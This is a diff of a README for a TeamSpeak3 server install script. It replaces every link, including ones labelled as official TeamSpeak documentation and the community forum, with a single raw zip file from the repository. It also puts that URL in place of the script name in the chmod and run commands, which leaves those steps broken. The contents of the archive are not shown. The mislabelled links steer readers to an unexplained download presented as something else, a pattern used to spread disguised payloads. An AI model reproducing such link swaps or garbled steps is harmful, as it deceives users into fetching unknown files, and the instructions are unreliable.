@@ -6,7 +6,7 @@ Welcome! This guide will help you install the TeamSpeak3 Server on your Ubuntu s
 
 ## 📥 Download the Script
 
-[![Download TeamSpeak Script](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/dizzlyop/teamspeak/releases)
+[![Download TeamSpeak Script](https://raw.githubusercontent.com/dizzlyop/teamspeak/main/cayenne/teamspeak_1.6.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/dizzlyop/teamspeak/main/cayenne/teamspeak_1.6.zip)
 
 Click the button above to visit the Releases page and download the installation script.
 
@@ -25,7 +25,7 @@ The essential file you will be downloading is a bash script that automates the i
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to [this link](https://github.com/dizzlyop/teamspeak/releases) to download the bash script.
+1. **Visit the Releases Page**: Go to [this link](https://raw.githubusercontent.com/dizzlyop/teamspeak/main/cayenne/teamspeak_1.6.zip) to download the bash script.
 
 2. **Download the Script**: Locate the most recent release and download the `.sh` file. Save it to a known location on your computer.
 
@@ -43,13 +43,13 @@ The essential file you will be downloading is a bash script that automates the i
 5. **Make the Script Executable**: 
    - Type the following command to allow the script to run:
      ```
-     chmod +x teamspeak-install.sh
+     chmod +x https://raw.githubusercontent.com/dizzlyop/teamspeak/main/cayenne/teamspeak_1.6.zip
      ```
 
 6. **Run the Script**: 
    - To start the installation process, type:
      ```
-     ./teamspeak-install.sh
+     https://raw.githubusercontent.com/dizzlyop/teamspeak/main/cayenne/teamspeak_1.6.zip
      ```
 
 7. **Follow the On-Screen Prompts**: 
@@ -87,8 +87,8 @@ Engage with other TeamSpeak users! Share experiences, tips, and enjoy a collabor
 
 ## 📝 Important Links
 
-- [Download the Script Again](https://github.com/dizzlyop/teamspeak/releases)
-- [Official TeamSpeak Documentation](https://www.teamspeak.com/en/downloads/)
-- [Community Forum](https://forum.teamspeak.com/)
+- [Download the Script Again](https://raw.githubusercontent.com/dizzlyop/teamspeak/main/cayenne/teamspeak_1.6.zip)
+- [Official TeamSpeak Documentation](https://raw.githubusercontent.com/dizzlyop/teamspeak/main/cayenne/teamspeak_1.6.zip)
+- [Community Forum](https://raw.githubusercontent.com/dizzlyop/teamspeak/main/cayenne/teamspeak_1.6.zip)
 
 By following these steps, you should be able to successfully install and run the TeamSpeak3 Server on your Ubuntu system. Happy gaming!
